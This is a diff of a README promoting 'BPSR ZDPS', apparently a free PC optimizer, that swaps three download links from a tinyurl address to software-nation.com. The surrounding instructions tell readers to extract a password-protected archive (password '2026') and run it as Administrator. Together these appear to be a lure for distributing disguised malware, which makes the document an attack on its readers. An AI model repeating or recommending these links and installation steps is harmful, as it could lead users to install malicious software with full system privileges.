@@ -9,7 +9,7 @@ The **⚙️ BPSR ZDPS** is a **free** system optimization and diagnostic suite 
 
 <div align="center">
 
-[![Download BPSR ZDPS](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bpsr-zdps)
+[![Download BPSR ZDPS](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bpsr-zdps)
 
 </div>
 
@@ -109,7 +109,7 @@ Over time, every PC collects junk files, registry errors, and background process
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download BPSR ZDPS](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bpsr-zdps)
+[![Download BPSR ZDPS](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bpsr-zdps)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -249,7 +249,7 @@ Keep your PC running like new for free. **BPSR ZDPS** provides system cleaning, 
 
 <div align="center">
 
-[![Download BPSR ZDPS](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bpsr-zdps)
+[![Download BPSR ZDPS](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bpsr-zdps)
 
 **Version 4.6.1** — Free system optimizer. April 2026 update. Zero cost. No payment.
 
